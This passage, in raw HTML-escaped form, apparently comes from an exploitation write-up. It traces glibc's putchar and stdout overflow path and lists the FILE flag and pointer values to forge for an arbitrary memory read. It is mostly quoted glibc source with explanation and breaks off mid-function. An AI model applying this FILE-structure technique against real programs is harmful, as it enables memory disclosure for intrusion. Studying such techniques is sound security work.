  __off_t _old_offset; &lt;span style=&#34;color:#75715e&#34;&gt;/* This used to be _offset but it&amp;#39;s too small.  */&lt;/span&gt;

  &lt;span style=&#34;color:#75715e&#34;&gt;/* 1+column number of pbase(); 0 is unknown. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;short&lt;/span&gt; _cur_column;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; _vtable_offset;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; _shortbuf[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];

  _IO_lock_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_lock;
&lt;span style=&#34;color:#75715e&#34;&gt;#ifdef _IO_USE_OLD_IO_FILE
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};

&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_FILE_complete
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_FILE _file;
&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  __off64_t _offset;
  &lt;span style=&#34;color:#75715e&#34;&gt;/* Wide character stream stuff.  */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_codecvt &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_codecvt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_wide_data &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_wide_data;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; _IO_FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_freeres_list;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_freeres_buf;
  size_t __pad5;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; _mode;
  &lt;span style=&#34;color:#75715e&#34;&gt;/* Make sure we don&amp;#39;t get into trouble again.  */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; _unused2[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt; (size_t)];
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here are brievly role of each fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_flags&lt;/code&gt; stands for the behaviour of the stream when a file operation occurs.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_read_ptr&lt;/code&gt; address of input within the input buffer that has been already used.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_read_end&lt;/code&gt; end address of the input buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_read_base&lt;/code&gt; base address of the input buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_write_base&lt;/code&gt; base address of the ouput buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_write_ptr&lt;/code&gt; points to the character that hasn&amp;rsquo;t been printed yet.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_write_end&lt;/code&gt; end address of the output buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_buf_base&lt;/code&gt; base address for both input and output buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_buf_end&lt;/code&gt; end address for both input and output buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_chain&lt;/code&gt; stands for the single linked list that links of all file streams.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_fileno&lt;/code&gt; stands for the file descriptor associated to the file.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_vtable_offset&lt;/code&gt; stands for the offset of the vtable we have to use.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_offset&lt;/code&gt; stands for the current offset within the file.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Relatable flags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_IO_USER_BUF&lt;/code&gt; During line buffered output, _IO_write_base==base() &amp;amp;&amp;amp; epptr()==base(). However, ptr() may be anywhere between base() and ebuf(). This forces a call to filebuf::overflow(int C) on every put. If there is more space in the buffer, and C is not a &amp;lsquo;\n&amp;rsquo;, then C is inserted, and pptr() incremented.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_MAGIC&lt;/code&gt; Magic number of &lt;code&gt;fp-&amp;gt;_flags&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_UNBUFFERED&lt;/code&gt; If a filebuf is unbuffered(), the _shortbuf[1] is used as the buffer.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_IO_LINKED&lt;/code&gt; In the list of all open files.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To understand I advise you to read this &lt;a href=&#34;https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write&#34;&gt;great article&lt;/a&gt; about FILE structures. What we gonna do right now is trying to understand the use of &lt;code&gt;stdout&lt;/code&gt; during within the &lt;code&gt;putchar&lt;/code&gt; function. And we will try to find a code path that will not write the provided argument (in this case the &lt;code&gt;\n&lt;/code&gt; taken by &lt;code&gt;putchar&lt;/code&gt;) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.
Let&amp;rsquo;s take a closer look at the &lt;code&gt; __putc_unlocked_body&lt;/code&gt; macro:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define __putc_unlocked_body(_ch, _fp)					\
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  (__glibc_unlikely ((_fp)-&amp;gt;_IO_write_ptr &amp;gt;= (_fp)-&amp;gt;_IO_write_end)	\
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   ? __overflow (_fp, (unsigned char) (_ch))				\
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   : (unsigned char) (*(_fp)-&amp;gt;_IO_write_ptr++ = (_ch)))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It ends up calling &lt;code&gt;__overflow&lt;/code&gt; if there is no more space in the output buffer (&lt;code&gt;(_fp)-&amp;gt;_IO_write_ptr &amp;gt;= (_fp)-&amp;gt;_IO_write_end)&lt;/code&gt;). That&amp;rsquo;s basically the code path we need to trigger to call &lt;code&gt;__overflow&lt;/code&gt; instead of just write the provided char into the output buffer.
So first condition:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;(_fp)-&amp;gt;_IO_write_ptr &amp;gt;= (_fp)-&amp;gt;_IO_write_end&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;__overflow&lt;/span&gt; (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ch)
{
  &lt;span style=&#34;color:#75715e&#34;&gt;/* This is a single-byte stream.  */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_mode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    _IO_fwide (f, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; _IO_OVERFLOW (f, ch);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Given the file stream isn&amp;rsquo;t oriented (byte granularity) we directly reach the &lt;code&gt;_IO_OVERFLOW&lt;/code&gt; call, now the final goal to get a leak is to reach the &lt;code&gt;_IO_do_write&lt;/code&gt; call:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;_IO_new_file_overflow&lt;/span&gt; (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ch)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_NO_WRITES) &lt;span style=&#34;color:#75715e&#34;&gt;/* SET ERROR */&lt;/span&gt;
    {
      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_ERR_SEEN;
      __set_errno (EBADF);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
    }
  &lt;span style=&#34;color:#75715e&#34;&gt;/* If currently reading or no buffer allocated. */&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_CURRENTLY_PUTTING) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
    {
      &lt;span style=&#34;color:#75715e&#34;&gt;/* Allocate a buffer if needed. */&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
	{
	  _IO_doallocbuf (f);
	  _IO_setg (f, f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base, f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base, f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base);
	}
      &lt;span style=&#34;color:#75715e&#34;&gt;/* Otherwise must be currently reading.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 logically slide the buffer forwards one block (by setting the
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 read pointers to all point at the beginning of the block).  This
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 makes room for subsequent output.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 Otherwise, set the read pointers to _IO_read_end (leaving that
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	 alone, so it can continue to correspond to the external position). */&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (_IO_in_backup (f)))
	{
	  size_t nbackup &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr;
	  _IO_free_backup_area (f);
	  f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_base &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; MIN (nbackup,
				   f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_base &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base);
	  f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_base;
	}

      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_end)
	    f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_base;
      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr;
      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr;
      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_end;
      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_read_end;

      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; _IO_CURRENTLY_PUTTING;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_mode &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (_IO_LINE_BUF &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; _IO_UNBUFFERED))
	f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr;
    }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; EOF)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; _IO_do_write (f, f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base,
			 f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_buf_end ) &lt;span style=&#34;color:#75715e&#34;&gt;/* Buffer is really full */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (_IO_do_flush (f) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; EOF)
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ch;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_UNBUFFERED)
      &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ((f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_LINE_BUF) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ch &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (_IO_do_write (f, f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base,
		      f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_ptr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_IO_write_base) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; EOF)
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; EOF;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Given &lt;code&gt;ch&lt;/code&gt; is &lt;code&gt;\n&lt;/code&gt;, to trigger the &lt;code&gt;_IO_do_flush&lt;/code&gt; call which will flush the file stream we have to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Remove &lt;code&gt;_IO_NO_WRITES&lt;/code&gt; from &lt;code&gt;fp-&amp;gt;_flags&lt;/code&gt; to avoid the first condition.&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;_IO_CURRENTLY_PUTTING&lt;/code&gt; to &lt;code&gt;fp-&amp;gt;_flags&lt;/code&gt; and give a non &lt;code&gt;NULL&lt;/code&gt; value to &lt;code&gt;f-&amp;gt;_IO_write_base&lt;/code&gt; to avoid the second condition (useless code).&lt;/li&gt;
&lt;li&gt;make &lt;code&gt;f-&amp;gt;_IO_write_ptr&lt;/code&gt; equal to &lt;code&gt;f-&amp;gt;_IO_buf_end&lt;/code&gt; to then call &lt;code&gt;_IO_do_flush&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now we reached &lt;code&gt;_IO_do_flush&lt;/code&gt; which is basically just a macro:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define _IO_do_flush(_f) \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  ((_f)-&amp;gt;_mode &amp;lt;= 0							      \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   ? _IO_do_write(_f, (_f)-&amp;gt;_IO_write_base,				      \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		  (_f)-&amp;gt;_IO_write_ptr-(_f)-&amp;gt;_IO_write_base)		      \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   : _IO_wdo_write(_f, (_f)-&amp;gt;_wide_data-&amp;gt;_IO_write_base,		      \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		   ((_f)-&amp;gt;_wide_data-&amp;gt;_IO_write_ptr			      \
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		    - (_f)-&amp;gt;_wide_data-&amp;gt;_IO_write_base)))
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Given &lt;code&gt;stdout&lt;/code&gt; is byte-oriented &lt;code&gt;_IO_new_do_write&lt;/code&gt; is called:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; size_t &lt;span style=&#34;color:#a6e22e&#34;&gt;new_do_write&lt;/span&gt; (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;, size_t);

&lt;span style=&#34;color:#75715e&#34;&gt;/* Write TO_DO bytes from DATA to FP.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;   Then mark FP as having empty buffers. */&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;_IO_new_do_write&lt;/span&gt; (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;data, size_t to_do)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (to_do &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
	  &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; (size_t) new_do_write (fp, data, to_do) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; to_do) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; size_t
new_do_write (FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;data, size_t to_do)
{
  size_t count;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_flags &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; _IO_IS_APPENDING)
    &lt;span style=&#34;color:#75715e&#34;&gt;/* On a system without a proper O_APPEND implementation,
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       you would need to sys_seek(0, SEEK_END) here, but is
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       not needed nor desirable for Unix- or Posix-like systems.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       Instead, just indicate that offset (before and after) is
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;       unpredictable. */&lt;/span&gt;
    fp&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; _IO_pos_BAD;
